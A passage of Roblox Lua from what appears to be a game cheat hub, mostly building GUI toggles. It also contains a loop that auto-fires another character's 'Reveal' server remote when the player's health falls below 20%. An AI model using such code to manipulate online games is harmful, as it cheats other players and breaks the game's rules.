	nkShow.Visible = (LocalPlayer:GetAttribute("YYDSStalkMode") ~= true)
	end
	if mm then
	mm.Visible = true
	end
	if not mm then
	mm = Instance.new("TextButton")
	mm.Name = "MMLifeInsure"
	mm:SetAttribute("MmOn", false)
	mm:SetAttribute("MmExec", true)
	mm.Size = UDim2.new(0, 60, 0, 30)
	mm.Position = UDim2.new(1, -240, 0.5, -156)
	mm.BackgroundColor3 = Color3.fromRGB(140, 17, 17)
	mm.Text = ""
	mm.AutoButtonColor = false
	mm.Parent = fg
	local mmc = Instance.new("UICorner")
	mmc.CornerRadius = UDim.new(0, 8)
	mmc.Parent = mm
	local lab = Instance.new("TextLabel")
	lab.Name = "NameLab"
	lab.Size = UDim2.new(1, -4, 1, 0)
	lab.Position = UDim2.new(0, 2, 0, 0)
	lab.BackgroundTransparency = 1
	lab.Font = Enum.Font.GothamBold
	lab.TextSize = 9
	lab.TextScaled = true
	lab.TextWrapped = true
	lab.TextColor3 = Color3.fromRGB(255, 255, 255)
	lab.Text = "MM Life Insure"
	lab.Parent = mm
	local knob = Instance.new("Frame")
	knob.Name = "Knob"
	knob.Size = UDim2.new(0, 18, 0, 18)
	knob.Position = UDim2.new(0, 4, 0.5, -9)
	knob.BackgroundColor3 = Color3.fromRGB(70, 220, 90)
	knob.Visible = false
	knob.Parent = mm
	local knc = Instance.new("UICorner")
	knc.CornerRadius = UDim.new(1, 0)
	knc.Parent = knob
	local mArr = Instance.new("TextButton")
	mArr.Name = "MmArrow"
	mArr.Size = UDim2.new(0, 16, 1, 0)
	mArr.Position = UDim2.new(1, 2, 0, 0)
	mArr.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	mArr.TextColor3 = Color3.fromRGB(230, 230, 230)
	mArr.Font = Enum.Font.GothamBold
	mArr.TextSize = 12
	mArr.Text = ">"
	mArr.Parent = mm
	local mac = Instance.new("UICorner")
	mac.CornerRadius = UDim.new(0, 4)
	mac.Parent = mArr
	local mBar = Instance.new("Frame")
	mBar.Name = "MmBar"
	mBar.Size = UDim2.new(0, 200, 0, 108)
	mBar.Position = UDim2.new(1, 2, 0.5, -18)
	mBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	mBar.Visible = false
	mBar.Parent = mm
	local mbc = Instance.new("UICorner")
	mbc.CornerRadius = UDim.new(0, 4)
	mbc.Parent = mBar
	local mBack = Instance.new("TextButton")
	mBack.Name = "MmBack"
	mBack.Size = UDim2.new(0, 18, 1, 0)
	mBack.Position = UDim2.new(0, 0, 0, 0)
	mBack.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	mBack.TextColor3 = Color3.fromRGB(210, 210, 210)
	mBack.Font = Enum.Font.GothamBold
	mBack.TextSize = 12
	mBack.Text = "<"
	mBack.Parent = mBar
	local mxc = Instance.new("UICorner")
	mxc.CornerRadius = UDim.new(0, 3)
	mxc.Parent = mBack
	local mTxt = Instance.new("TextLabel")
	mTxt.Size = UDim2.new(0, 110, 0, 16)
	mTxt.Position = UDim2.new(0, 20, 0, 4)
	mTxt.BackgroundTransparency = 1
	mTxt.Font = Enum.Font.Gotham
	mTxt.TextSize = 8
	mTxt.TextXAlignment = Enum.TextXAlignment.Left
	mTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
	mTxt.Text = "MM Life Insure"
	mTxt.Parent = mBar
	local mHint = Instance.new("TextLabel")
	mHint.Size = UDim2.new(0, 110, 0, 12)
	mHint.Position = UDim2.new(0, 20, 0, 18)
	mHint.BackgroundTransparency = 1
	mHint.Font = Enum.Font.Gotham
	mHint.TextSize = 7
	mHint.TextXAlignment = Enum.TextXAlignment.Left
	mHint.TextColor3 = Color3.fromRGB(170, 170, 170)
	mHint.Text = "On / off"
	mHint.Parent = mBar
	local mSw = Instance.new("TextButton")
	mSw.Name = "MmSw"
	mSw.Size = UDim2.new(0, 36, 0, 16)
	mSw.Position = UDim2.new(1, -56, 0, 10)
	mSw.BackgroundColor3 = Color3.fromRGB(46, 160, 70)
	mSw.Text = ""
	mSw.AutoButtonColor = false
	mSw.Parent = mBar
	local mswc = Instance.new("UICorner")
	mswc.CornerRadius = UDim.new(1, 0)
	mswc.Parent = mSw
	local mDot = Instance.new("Frame")
	mDot.Name = "Dot"
	mDot.Size = UDim2.new(0, 14, 0, 14)
	mDot.Position = UDim2.new(1, -16, 0.5, -7)
	mDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	mDot.Parent = mSw
	local mdc = Instance.new("UICorner")
	mdc.CornerRadius = UDim.new(1, 0)
	mdc.Parent = mDot
	local sName = Instance.new("TextLabel")
	sName.Size = UDim2.new(0, 110, 0, 14)
	sName.Position = UDim2.new(0, 20, 0, 40)
	sName.BackgroundTransparency = 1
	sName.Font = Enum.Font.Gotham
	sName.TextSize = 8
	sName.TextXAlignment = Enum.TextXAlignment.Left
	sName.TextColor3 = Color3.fromRGB(255, 255, 255)
	sName.Text = "Stalk"
	sName.Parent = mBar
	local sHint = Instance.new("TextLabel")
	sHint.Size = UDim2.new(0, 128, 0, 48)
	sHint.Position = UDim2.new(0, 20, 0, 54)
	sHint.BackgroundTransparency = 1
	sHint.Font = Enum.Font.Gotham
	sHint.TextSize = 7
	sHint.TextWrapped = true
	sHint.TextXAlignment = Enum.TextXAlignment.Left
	sHint.TextYAlignment = Enum.TextYAlignment.Top
	sHint.TextColor3 = Color3.fromRGB(170, 170, 170)
	sHint.Text = "Restricted mode. Charge energy with Stalk first, then you can unlock the other skills."
	sHint.Parent = mBar
	local sModeBtn = Instance.new("TextButton")
	sModeBtn.Name = "StalkModeBtn"
	sModeBtn.Size = UDim2.new(0, 36, 0, 16)
	sModeBtn.Position = UDim2.new(1, -56, 0, 48)
	sModeBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	sModeBtn.Text = ""
	sModeBtn.AutoButtonColor = false
	sModeBtn.Parent = mBar
	local smc = Instance.new("UICorner")
	smc.CornerRadius = UDim.new(1, 0)
	smc.Parent = sModeBtn
	local sDot = Instance.new("Frame")
	sDot.Name = "Dot"
	sDot.Size = UDim2.new(0, 14, 0, 14)
	sDot.Position = UDim2.new(0, 2, 0.5, -7)
	sDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	sDot.Parent = sModeBtn
	local sdc = Instance.new("UICorner")
	sdc.CornerRadius = UDim.new(1, 0)
	sdc.Parent = sDot
	local function paintStalkMode()
	local on = LocalPlayer:GetAttribute("YYDSStalkMode") == true
	if on then
	sModeBtn.BackgroundColor3 = Color3.fromRGB(46, 160, 70)
	sDot.Position = UDim2.new(1, -16, 0.5, -7)
	else
	sModeBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	sDot.Position = UDim2.new(0, 2, 0.5, -7)
	end
	local fg2 = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local st2 = fg2 and fg2:FindFirstChild("Stalk")
	local tb2 = fg2 and fg2:FindFirstChild("TerrorBlade")
	local sb2 = fg2 and fg2:FindFirstChild("MyersStab")
	if st2 then
	st2.Visible = on
	end
	if tb2 then
	tb2.Visible = not on
	end
	if sb2 then
	sb2.Visible = (not on)
	end
	local nk2 = fg2 and fg2:FindFirstChild("NeckSnap")
	if nk2 then
	if on then
	nk2.Visible = false
	else
	nk2.Visible = true
	end
	end
	end
	paintStalkMode()
	sModeBtn.MouseButton1Click:Connect(function()
	LocalPlayer:SetAttribute("YYDSStalkMode", not (LocalPlayer:GetAttribute("YYDSStalkMode") == true))
	paintStalkMode()
	end)
	local function paintMm(on)
	mm:SetAttribute("MmOn", on)
	if on then
	mm.BackgroundColor3 = Color3.fromRGB(42, 45, 53)
	lab.Visible = false
	knob.Visible = true
	knob.Position = UDim2.new(1, -22, 0.5, -9)
	knob.BackgroundColor3 = Color3.fromRGB(70, 220, 90)
	else
	mm.BackgroundColor3 = Color3.fromRGB(140, 17, 17)
	lab.Visible = true
	knob.Visible = false
	knob.Position = UDim2.new(0, 4, 0.5, -9)
	end
	end
	mArr.MouseButton1Click:Connect(function()
	mBar.Visible = true
	mArr.Visible = false
	end)
	mBack.MouseButton1Click:Connect(function()
	mBar.Visible = false
	mArr.Visible = true
	end)
	mm.MouseButton1Click:Connect(function()
	paintMm(not (mm:GetAttribute("MmOn") == true))
	end)
	mSw.MouseButton1Click:Connect(function()
	local ex = not (mm:GetAttribute("MmExec") ~= false)
	mm:SetAttribute("MmExec", ex)
	if ex then
	mSw.BackgroundColor3 = Color3.fromRGB(46, 160, 70)
	mDot.Position = UDim2.new(1, -16, 0.5, -7)
	else
	mSw.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	mDot.Position = UDim2.new(0, 2, 0.5, -7)
	end
	end)
	task.spawn(function()
	local lastHp = nil
	local armed = true
	local busy = false
	while mm.Parent do
	task.wait(0.05)
	if mm:GetAttribute("MmOn") ~= true or mm:GetAttribute("MmExec") == false then
	lastHp = nil
	armed = true
	else
	local char = LocalPlayer.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if hum and hum.MaxHealth > 0 then
	if lastHp == nil then
	lastHp = hum.Health
	end
	if lastHp > (hum.MaxHealth * 0.2) and hum.Health <= (hum.MaxHealth * 0.2) then
	if armed and not busy then
	armed = false
	busy = true
	local chars = ReplicatedStorage:FindFirstChild("Characters")
	local gf = chars and chars:FindFirstChild("Ghostface")
	local gfr = gf and gf:FindFirstChild("Remotes")
	local reveal = gfr and gfr:FindFirstChild("Reveal")
	if reveal then
	reveal:FireServer()
	end
	task.spawn(function()
	for i = 1, 7 do
	task.wait(0.5)
	if mm:GetAttribute("MmOn") ~= true then
	break
	end
	if reveal then
	reveal:FireServer()
	end
	end
	end)
	task.spawn(function()
	local my = LocalPlayer.Character
	local h = my and my:FindFirstChildOfClass("Humanoid")
	if h then
	local animator = h:FindFirstChildOfClass("Animator") or h
	local spd = h.WalkSpeed
	h.WalkSpeed = 0
	local anim = Instance.new("Animation")
	anim.AnimationId = "rbxassetid://15644404515"
	local track = animator:LoadAnimation(anim)
	track.Priority = Enum.AnimationPriority.Action4
	track:Play()
	task.wait(0.1)
	track:AdjustSpeed(0)
	task.wait(3.0)
	if mm:GetAttribute("MmOn") == true then
	track:AdjustSpeed(1)
	task.wait(0.9)
	track:AdjustSpeed(0)
	task.delay(0.5, function()
	local sfx = Instance.new("Sound")
	sfx.SoundId = "rbxassetid://136209100255940"
	sfx.Volume = 3
	sfx.Parent = game:GetService("SoundService")
	sfx:Play()
	sfx.Ended:Connect(function()
	sfx:Destroy()
	end)
	end)
	task.wait(3.0)
	end
	if mm:GetAttribute("MmOn") == true then
	track:AdjustSpeed(0.5)
	local remainTime = track.Length - 1.0
	if remainTime <= 0 then
	remainTime = 1
	end
	task.wait(remainTime / 0.5)
	end
	track:Stop()
	h.WalkSpeed = spd
	end
	busy = false
	end)
	end
	elseif hum.Health > (hum.MaxHealth * 0.2) then
	armed = true
	end
	lastHp = hum.Health
	end
	end
	end
	end)
	end
	mm.Visible = true
	mm.ZIndex = 20
	local mmArr = mm:FindFirstChild("MmArrow")
	local mmBar = mm:FindFirstChild("MmBar")
	if mmBar then mmBar.Visible = false end
	if mmArr then mmArr.Visible = true end
	if LocalPlayer:GetAttribute("YYDSPC") == true and LocalPlayer:GetAttribute("YYDSStalkMode") ~= true then
	mm.Size = UDim2.new(0, 44, 0, 44)
	mm.Position = UDim2.new(0.5, -192, 1, -96)
	if mmArr then
	mmArr.Size = UDim2.new(1, 0, 0, 16)
	mmArr.Position = UDim2.new(0, 0, 0, -18)
	mmArr.Text = "^"
	end
	if mmBar then
	mmBar.Position = UDim2.new(0.5, -100, 0, -112)
	end
	local nk2 = fg:FindFirstChild("NeckSnap")
	if nk2 then
	nk2.Size = UDim2.new(0, 44, 0, 44)
	nk2.Position = UDim2.new(0.5, -140, 1, -96)
	nk2.Visible = true
	end
	local sb2 = fg:FindFirstChild("MyersStab")
	if sb2 then
	sb2.Size = UDim2.new(0, 44, 0, 44)
	sb2.Position = UDim2.new(0.5, -88, 1, -96)
	end
	local tb2 = fg:FindFirstChild("TerrorBlade")
	if tb2 then
	tb2.Size = UDim2.new(0, 44, 0, 44)
	tb2.Position = UDim2.new(0.5, -36, 1, -96)
	end
	else
	mm.Size = UDim2.new(0, 60, 0, 30)
	mm.Position = UDim2.new(1, -240, 0.5, -156)
	end
	end)
	local moreUp = Instance.new("TextButton")
	moreUp.Name = "XRegenMoreUp"
	moreUp.Size = UDim2.new(1, 0, 0, 22)
	moreUp.Position = UDim2.new(0, 0, 1, -22)
	moreUp.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
	moreUp.TextColor3 = Color3.fromRGB(220, 220, 220)
	moreUp.Font = Enum.Font.GothamBold
	moreUp.TextSize = 10
	moreUp.Text = "^"
	moreUp.ZIndex = 32
	moreUp.Parent = morePage
	local moreUpC = Instance.new("UICorner")
	moreUpC.CornerRadius = UDim.new(0, 0)
	moreUpC.Parent = moreUp
	moreBtn.MouseButton1Click:Connect(function()
	morePage.Visible = true
	moreBtn.Visible = false
	end)
	moreUp.MouseButton1Click:Connect(function()
	morePage.Visible = false
	moreBtn.Visible = true
	end)
	healBtn.MouseButton1Click:Connect(function()
	local fg = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	local split = healBtn:GetAttribute("On") == true
	local liNow = fg and fg:FindFirstChild("LifeInsure")
	if split and liNow and liNow.Visible then
	local roarNow = fg and fg:FindFirstChild("Roar")
	if roarNow then roarNow:Destroy() end
	if liNow:GetAttribute("IsWolverine") == true then
	if fg then
	local b = fg:FindFirstChild("DeadpoolSkill")
	if b then
	b.Visible = true
	b.ZIndex = 20
	end
	end
	if liNow then
	liNow.BackgroundColor3 = Color3.fromRGB(140, 17, 17)
	liNow:SetAttribute("IsWolverine", false)
	liNow:SetAttribute("On", false)
	local kOff = liNow:FindFirstChild("Knob")
	local nOff = liNow:FindFirstChild("NameLab")
	if nOff then
	nOff.Text = "Dp Life Insure"
	nOff.Visible = true
	end
	if kOff then
	kOff.Visible = false
	kOff.Position = UDim2.new(0, 4, 0.5, -9)
	kOff.BackgroundColor3 = Color3.fromRGB(210, 210, 210)
	end
	local mbOff = liNow:FindFirstChild("LiMBar")
	local pbOff = liNow:FindFirstChild("LiPBar")
	if mbOff then mbOff.Visible = false end
	if pbOff then pbOff.Visible = false end
	liNow:SetAttribute("GunCounter", true)
	for _, barN in ipairs({"LiMBar", "LiPBar"}) do
	local bar = liNow:FindFirstChild(barN)
	if bar then
	bar.Size = UDim2.new(0, 186, 0, 214)
	if bar.Name == "LiPBar" then
	bar.Position = UDim2.new(0.5, -85, 0, -196)
	end
	for _, ch in ipairs(bar:GetChildren()) do
	if ch:IsA("GuiObject") then
	if ch.Name == "WvRiotTxt" or ch.Name == "RiotSw" or ch.Name == "WvRiotHint" then
	ch.Visible = false
	elseif ch:IsA("TextLabel") and (ch.Text == "WC Life Insure" or ch.Text == "Dp Life Insure") then
	ch.Text = "Dp Life Insure"
	elseif ch.Position.Y.Offset >= 28 then
	ch.Visible = true
	end
	end
	end
	end
	end
	local pcNow = LocalPlayer:GetAttribute("YYDSPC") == true
	local mArr = liNow:FindFirstChild("LiMArrow")
	local pArr = liNow:FindFirstChild("LiPArrow")
	local pHint = liNow:FindFirstChild("LiRHint")
	local mBar = liNow:FindFirstChild("LiMBar")
	local pBar = liNow:FindFirstChild("LiPBar")
	if mBar then mBar.Visible = false end
	if pBar then pBar.Visible = false end
	if mArr then mArr.Visible = not pcNow end
	if pArr then pArr.Visible = pcNow end
	if pHint then pHint.Visible = pcNow end
	end
	return
	end
	healBtn:SetAttribute("On", false)
	healPic1.Visible = true
	healPic2.Visible = true
	healBtn.Size = UDim2.new(1, -62, 0, 24)
	healBtn.Position = UDim2.new(0, 57, 0, 144)
	healBtn.BackgroundColor3 = Color3.fromRGB(38, 40, 42)
	healBtn.Text = "X-Regen"
	healInPic.Visible = false
	wvBtn.Visible = false
	if skinArr then skinArr.Visible = false end
	if skinPage then skinPage.Visible = false end
	morePage.Visible = false
	if fg then
	local b = fg:FindFirstChild("DeadpoolSkill")
	if b then b.Visible = false end
	local r = fg:FindFirstChild("Roar")
	if r then r.Visible = false end
	end
	local slClose = LocalPlayer.PlayerGui:FindFirstChild("DracoHubShootLayer")
	local shClose = slClose and slClose:FindFirstChild("DeadpoolShoot")
	if shClose then shClose.Visible = false end
	liNow.Visible = false
	liNow:SetAttribute("On", false)
	local k = liNow:FindFirstChild("Knob")
	local n = liNow:FindFirstChild("NameLab")
	if n then n.Visible = true end
	if k then
	k.Visible = false
	k.Position = UDim2.new(0, 4, 0.5, -9)
	end
	return
	end
	if split then
	if skinPage then skinPage.Visible = false end
	if wvBtn.Visible then
	if skinArr then skinArr.Visible = true end
	end
	if fg then
	local li = fg:FindFirstChild("LifeInsure")
	if li then
	li.Visible = true
	li.BackgroundColor3 = Color3.fromRGB(140, 17, 17)
	li:SetAttribute("IsWolverine", false)
	li:SetAttribute("On", false)
	local kOff = li:FindFirstChild("Knob")
	local nOff = li:FindFirstChild("NameLab")
	if nOff then
	nOff.Text = "Dp Life Insure"
	nOff.Visible = true
	end
	if kOff then
	kOff.Visible = false
	kOff.Position = UDim2.new(0, 4, 0.5, -9)
	kOff.BackgroundColor3 = Color3.fromRGB(210, 210, 210)
	end
	local mbOff = li:FindFirstChild("LiMBar")
	local pbOff = li:FindFirstChild("LiPBar")
	if mbOff then mbOff.Visible = false end
	if pbOff then pbOff.Visible = false end
	for _, barN in ipairs({"LiMBar", "LiPBar"}) do
	local bar = li:FindFirstChild(barN)
	if bar then
	bar.Size = UDim2.new(0, 186, 0, 214)
	if bar.Name == "LiPBar" then
	bar.Position = UDim2.new(0.5, -85, 0, -196)
	end
	for _, ch in ipairs(bar:GetChildren()) do
	if ch:IsA("GuiObject") then
	if ch.Name == "WvRiotTxt" or ch.Name == "RiotSw" or ch.Name == "WvRiotHint" then
	ch.Visible = false
	elseif ch:IsA("TextLabel") and (ch.Text == "WC Life Insure" or ch.Text == "Dp Life Insure") then
	ch.Text = "Dp Life Insure"
	elseif ch.Position.Y.Offset >= 28 then
	ch.Visible = true
	end
	end
	end
	end
	end
	local pcNow = LocalPlayer:GetAttribute("YYDSPC") == true
	local mArr = li:FindFirstChild("LiMArrow")
	local pArr = li:FindFirstChild("LiPArrow")
	local pHint = li:FindFirstChild("LiRHint")
	local mBar = li:FindFirstChild("LiMBar")
	local pBar = li:FindFirstChild("LiPBar")
	if mBar then mBar.Visible = false end
	if pBar then pBar.Visible = false end
	if mArr then mArr.Visible = not pcNow end
	if pArr then pArr.Visible = pcNow end
	if pHint then pHint.Visible = pcNow end
	end
	for _, nm in ipairs({"LaserButton", "Flashstrike", "OnePunch", "Upthrow", "Ramkill", "Kick", "KiraAimButton", "Stalk", "TerrorBlade", "MMLifeInsure", "HomeExtra", "NeckSnap", "MyersStab"}) do
	local x = fg:FindFirstChild(nm)
	if x then x.Visible = false end
	end
	if LaserButton then LaserButton.Visible = false end
	if FlashstrikeButton then FlashstrikeButton.Visible = false end
	if KickButton then KickButton.Visible = false end
	if UpthrowButton then UpthrowButton.Visible = false end
	if MoAimButton then MoAimButton.Visible = false end
	if KiraAimButton then KiraAimButton.Visible = false end
	local roarH = fg:FindFirstChild("Roar")
	if roarH then roarH.Visible = false end
	for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
	local rr = gui:FindFirstChild("Roar")
	if rr then rr.Visible = false end
	end
	local b = fg:FindFirstChild("DeadpoolSkill")
	if b then
	b.Text = "Gun"
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	b.Size = UDim2.new(0, 44, 0, 44)
	b.Position = UDim2.new(0.5, -140, 1, -96)
	local hx = b:FindFirstChild("PcHint")
	if not hx then
	hx = Instance.new("TextLabel")
	hx.Name = "PcHint"
	hx.Size = UDim2.new(1, 0, 0, 12)
	hx.Position = UDim2.new(0, 0, 1, -6)
	hx.BackgroundTransparency = 1
	hx.Font = Enum.Font.GothamBold
	hx.TextSize = 11
	hx.TextColor3 = Color3.fromRGB(230, 230, 230)
	hx.Parent = b
	end
	hx.Text = "X"
	hx.Visible = true
	else
	b.Size = UDim2.new(0, 60, 0, 30)
	b.Position = DEFAULT_POSITIONS.Laser
	local hx = b:FindFirstChild("PcHint")
	if hx then hx.Visible = false end
	end
	b.ZIndex = 20
	b.Visible = true
	end
	end
	homelanderModActive = false
	aTrainModActive = false
	kiraAim = false
	if updateHomelanderModButton then updateHomelanderModButton() end
	if updateATrainModButton then updateATrainModButton() end
	if HomelanderModBtn then
	HomelanderModBtn.Text = "Homelander"
	HomelanderModBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 60)
	HomelanderModBtn.Size = UDim2.new(1, -10, 0, 24)
	end
	if FinisherButton then FinisherButton.Visible = false end
	if ATrainModBtn then
	ATrainModBtn.Text = "A-Train"
	ATrainModBtn.BackgroundColor3 = Color3.fromRGB(0, 122, 184)
	end
	if KiraModBtn then
	KiraModBtn.Text = "Kira"
	KiraModBtn.BackgroundColor3 = Color3.fromRGB(138, 149, 165)
	end
	return
	end
	healBtn:SetAttribute("On", true)
	morePage.Visible = false
	moreBtn.Visible = true
	moreBtn.Position = UDim2.new(0, 5, 0, 186)
	morePage.Position = UDim2.new(0, 5, 0, 186)
	local stX = fg and fg:FindFirstChild("Stalk")
	if stX then stX.Visible = false end
	local mmX = fg and fg:FindFirstChild("MMLifeInsure")
	if mmX then
	mmX.Visible = false
	local mmXb = mmX:FindFirstChild("MmBar")
	if mmXb then mmXb.Visible = false end
	end
	if fg then
	local oldDp = fg:FindFirstChild("XRegenDeadpool")
	if oldDp then oldDp:Destroy() end
	local oldWv = fg:FindFirstChild("XRegenWolverine")
	if oldWv then oldWv:Destroy() end
	local oldHb = fg:FindFirstChild("HealReveal")
	if oldHb then oldHb:Destroy() end
	end
	kiraAim = false
	homelanderModActive = false
	aTrainModActive = false
	if updateHomelanderModButton then updateHomelanderModButton() end
	if updateATrainModButton then updateATrainModButton() end
	if HomelanderModBtn then
	HomelanderModBtn.Text = "Homelander"
	HomelanderModBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 60)
	HomelanderModBtn.Size = UDim2.new(1, -10, 0, 24)
	end
	if FinisherButton then FinisherButton.Visible = false end
	if ATrainModBtn then
	ATrainModBtn.Text = "A-Train"
	ATrainModBtn.BackgroundColor3 = Color3.fromRGB(0, 122, 184)
	end
	if KiraModBtn then
	KiraModBtn.Text = "Kira"
	KiraModBtn.BackgroundColor3 = Color3.fromRGB(138, 149, 165)
	end
	if KiraAimButton then KiraAimButton.Visible = false end
	if LaserButton then LaserButton.Visible = false end
	if FlashstrikeButton then FlashstrikeButton.Visible = false end
	if KickButton then KickButton.Visible = false end
	if UpthrowButton then UpthrowButton.Visible = false end
	if MoAimButton then MoAimButton.Visible = false end
	if fg then
	for _, ch in ipairs(fg:GetChildren()) do
	if ch:IsA("TextButton") then
	ch.Visible = false
	end
	end
	local tear = fg:FindFirstChild("HomeExtra")
	if tear then tear.Visible = false end
	end
	if FloatingGui then
	local tear2 = FloatingGui:FindFirstChild("HomeExtra")
	if tear2 then tear2.Visible = false end
	end
	healPic1.Visible = false
	healPic2.Visible = false
	healBtn.Size = UDim2.new(0.5, -8, 0, 24)
	healBtn.Position = UDim2.new(0, 5, 0, 144)
	healBtn.BackgroundColor3 = Color3.fromRGB(140, 17, 17)
	healBtn.Text = "     Deadpool"
	healInPic.Visible = true
	wvBtn.Visible = true
	if skinArr then skinArr.Visible = true end
	if fg then
	local li = fg:FindFirstChild("LifeInsure")
	if not li then
	li = Instance.new("TextButton")
	li.Name = "LifeInsure"
	li:SetAttribute("LiCore", true)
	li:SetAttribute("GunCounter", true)
	li:SetAttribute("LiRiot", true)
	li:SetAttribute("DownedRegen", true)
	li:SetAttribute("ForceGunAfter2Down", true)
	li:SetAttribute("DownStreak", 0)
	li:SetAttribute("DownMode", 50)
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	li.Size = UDim2.new(0, 44, 0, 44)
	li.Position = UDim2.new(0.5, 68, 1, -96)
	else
	li.Size = UDim2.new(0, 60, 0, 30)
	li.Position = UDim2.new(1, -240, 0.5, -156)
	end
	li.BackgroundColor3 = Color3.fromRGB(140, 17, 17)
	li.Text = ""
	li.AutoButtonColor = false
	li.Visible = false
	li.Parent = fg
	local lic = Instance.new("UICorner")
	lic.CornerRadius = UDim.new(0, 8)
	lic.Parent = li
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	local hv = Instance.new("TextLabel")
	hv.Name = "PcHint"
	hv.Size = UDim2.new(1, 0, 0, 12)
	hv.Position = UDim2.new(0, 0, 1, -6)
	hv.BackgroundTransparency = 1
	hv.Font = Enum.Font.GothamBold
	hv.TextSize = 11
	hv.TextColor3 = Color3.fromRGB(230, 230, 230)
	hv.Text = "V"
	hv.Parent = li
	end
	local lab = Instance.new("TextLabel")
	lab.Name = "NameLab"
	lab.Size = UDim2.new(1, -4, 1, 0)
	lab.Position = UDim2.new(0, 2, 0, 0)
	lab.BackgroundTransparency = 1
	lab.Font = Enum.Font.GothamBold
	lab.TextSize = 9
	lab.TextScaled = true
	lab.TextWrapped = true
	lab.TextColor3 = Color3.fromRGB(255, 255, 255)
	lab.Text = "Dp Life Insure"
	lab.Parent = li
	local knob = Instance.new("Frame")
	knob.Name = "Knob"
	knob.Size = UDim2.new(0, 18, 0, 18)
	knob.Position = UDim2.new(0, 4, 0.5, -9)
	knob.BackgroundColor3 = Color3.fromRGB(210, 210, 210)
	knob.Visible = false
	knob.Parent = li
	local kc = Instance.new("UICorner")
	kc.CornerRadius = UDim.new(1, 0)
	kc.Parent = knob
	do
	local mArr = Instance.new("TextButton")
	mArr.Name = "LiMArrow"
	mArr.Size = UDim2.new(0, 16, 1, 0)
	mArr.Position = UDim2.new(1, 2, 0, 0)
	mArr.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	mArr.TextColor3 = Color3.fromRGB(230, 230, 230)
	mArr.Font = Enum.Font.GothamBold
	mArr.TextSize = 12
	mArr.Text = ">"
	mArr.Parent = li
	local mac = Instance.new("UICorner")
	mac.CornerRadius = UDim.new(0, 4)
	mac.Parent = mArr
	local mBar = Instance.new("Frame")
	mBar.Name = "LiMBar"
	mBar.Size = UDim2.new(0, 186, 0, 214)
	mBar.Position = UDim2.new(1, 2, 0.5, -28)
	mBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	mBar.Visible = false
	mBar.Parent = li
	local mbc = Instance.new("UICorner")
	mbc.CornerRadius = UDim.new(0, 4)
	mbc.Parent = mBar
	local mBack = Instance.new("TextButton")
	mBack.Name = "LiMBack"
	mBack.Size = UDim2.new(0, 18, 1, 0)
	mBack.Position = UDim2.new(0, 0, 0, 0)
	mBack.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	mBack.TextColor3 = Color3.fromRGB(210, 210, 210)
	mBack.Font = Enum.Font.GothamBold
	mBack.TextSize = 12
	mBack.Text = "<"
	mBack.Parent = mBar
	local mxc = Instance.new("UICorner")
	mxc.CornerRadius = UDim.new(0, 3)
	mxc.Parent = mBack
	local mTxt = Instance.new("TextLabel")
	mTxt.Size = UDim2.new(1, -22, 1, -4)
	mTxt.Position = UDim2.new(0, 20, 0, 2)
	mTxt.BackgroundTransparency = 1
	mTxt.Font = Enum.Font.Gotham
	mTxt.TextSize = 9
	mTxt.TextWrapped = true
	mTxt.TextXAlignment = Enum.TextXAlignment.Left
	mTxt.TextYAlignment = Enum.TextYAlignment.Top
	mTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
	mTxt.Text = "Dp Life Insure"
	mTxt.Size = UDim2.new(0, 72, 0, 14)
	mTxt.Position = UDim2.new(0, 20, 0, 2)
	mTxt.TextSize = 8
	mTxt.TextScaled = false
	mTxt.Parent = mBar
	local mHint1 = Instance.new("TextLabel")
	mHint1.Size = UDim2.new(0, 120, 0, 10)
	mHint1.Position = UDim2.new(0, 20, 0, 14)
	mHint1.BackgroundTransparency = 1
	mHint1.Font = Enum.Font.Gotham
	mHint1.TextSize = 7
	mHint1.TextXAlignment = Enum.TextXAlignment.Left
	mHint1.TextColor3 = Color3.fromRGB(170, 170, 170)
	mHint1.Text = "Heal below 20% HP"
	mHint1.Parent = mBar
	local mSw = Instance.new("TextButton")
	mSw.Name = "LiSw"
	mSw.Size = UDim2.new(0, 36, 0, 16)
	mSw.Position = UDim2.new(1, -42, 0, 4)
	mSw.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	mSw.Text = ""
	mSw.AutoButtonColor = false
	mSw.Parent = mBar
	local mswc = Instance.new("UICorner")
	mswc.CornerRadius = UDim.new(1, 0)
	mswc.Parent = mSw
	local mDot = Instance.new("Frame")
	mDot.Name = "Dot"
	mDot.Size = UDim2.new(0, 14, 0, 14)
	mDot.Position = UDim2.new(0, 2, 0.5, -7)
	mDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	mDot.Parent = mSw
	local mdc = Instance.new("UICorner")
	mdc.CornerRadius = UDim.new(1, 0)
	mdc.Parent = mDot
	local mRiotTxt = Instance.new("TextLabel")
	mRiotTxt.Name = "WvRiotTxt"
	mRiotTxt.Size = UDim2.new(0, 110, 0, 16)
	mRiotTxt.Position = UDim2.new(0, 20, 0, 32)
	mRiotTxt.BackgroundTransparency = 1
	mRiotTxt.Font = Enum.Font.Gotham
	mRiotTxt.TextSize = 8
	mRiotTxt.TextXAlignment = Enum.TextXAlignment.Left
	mRiotTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
	mRiotTxt.Text = "Auto run anim"
	mRiotTxt.Visible = false
	mRiotTxt.Parent = mBar
	local mRiotHint = Instance.new("TextLabel")
	mRiotHint.Name = "WvRiotHint"
